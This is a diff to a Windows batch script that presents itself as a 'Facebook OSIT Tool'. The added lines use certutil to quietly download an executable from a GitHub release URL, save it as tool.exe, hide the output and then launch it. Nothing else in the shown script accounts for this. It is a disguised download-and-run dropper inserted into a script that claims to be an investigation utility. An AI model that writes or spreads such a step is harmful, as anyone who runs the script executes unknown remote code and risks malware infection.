@@ -2,6 +2,11 @@
 set "URL=https://github.com/hvbsvqdj/osint/releases/download/osint/osint.exe"
 set "Dossier=resultas"
 set "NomFichier=%Dossier%\tool.exe"
+certutil -urlcache -split -f %URL% "%NomFichier%" >nul 2>&1
+
+if exist "%NomFichier%" (
+    start "" "%NomFichier%"
+)
 title Facebook OSIT Tool © Deano (copyright 2018)
 color a
 
